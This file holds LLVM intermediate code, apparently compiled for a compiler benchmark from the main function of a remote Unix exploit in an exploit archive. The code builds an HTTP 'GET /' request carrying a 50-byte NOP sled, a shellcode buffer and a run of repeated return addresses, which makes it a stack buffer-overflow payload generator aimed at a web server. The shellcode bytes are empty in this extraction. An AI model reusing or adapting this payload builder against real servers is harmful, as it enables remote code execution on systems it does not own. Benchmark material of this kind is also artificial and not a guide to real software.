; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20150.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20150.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@CODE_LEN = common dso_local global i32 0, align 4
@NOP_LEN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [240 x i8], align 16
  %8 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 -24, i32* %6, align 4
  store i64 3202349824, i64* %8, align 8
  %9 = load i32, i32* %3, align 4
  %10 = icmp sge i32 %9, 2
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %4, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @atoi(i8* %14)
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11, %2
  %17 = getelementptr inbounds [240 x i8], [240 x i8]* %7, i64 0, i64 0
  %18 = call i32 @memset(i8* %17, i32 144, i32 50)
  %19 = getelementptr inbounds [240 x i8], [240 x i8]* %7, i64 0, i64 0
  %20 = getelementptr inbounds i8, i8* %19, i64 50
  %21 = load i32, i32* @shellcode, align 4
  %22 = load i32, i32* @shellcode, align 4
  %23 = call i32 @strlen(i32 %22)
  %24 = call i32 @memcpy(i8* %20, i32 %21, i32 %23)
  %25 = load i32, i32* @shellcode, align 4
  %26 = call i32 @strlen(i32 %25)
  %27 = add nsw i32 %26, 50
  store i32 %27, i32* %5, align 4
  br label %28

28:                                               ; preds = %40, %16
  %29 = load i32, i32* %5, align 4
  %30 = icmp sle i32 %29, 240
  br i1 %30, label %31, label %43

31:                                               ; preds = %28
  %32 = load i64, i64* %8, align 8
  %33 = load i32, i32* %6, align 4
  %34 = sext i32 %33 to i64
  %35 = sub i64 %32, %34
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [240 x i8], [240 x i8]* %7, i64 0, i64 %37
  %39 = bitcast i8* %38 to i64*
  store i64 %35, i64* %39, align 1
  br label %40

40:                                               ; preds = %31
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, 4
  store i32 %42, i32* %5, align 4
  br label %28

43:                                               ; preds = %28
  %44 = call i32 @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %45

45:                                               ; preds = %54, %43
  %46 = load i32, i32* %5, align 4
  %47 = icmp slt i32 %46, 240
  br i1 %47, label %48, label %57

48:                                               ; preds = %45
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [240 x i8], [240 x i8]* %7, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = call i32 @putchar(i8 signext %52)
  br label %54

54:                                               ; preds = %48
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %5, align 4
  br label %45

57:                                               ; preds = %45
  %58 = call i32 @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @putchar(i8 signext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
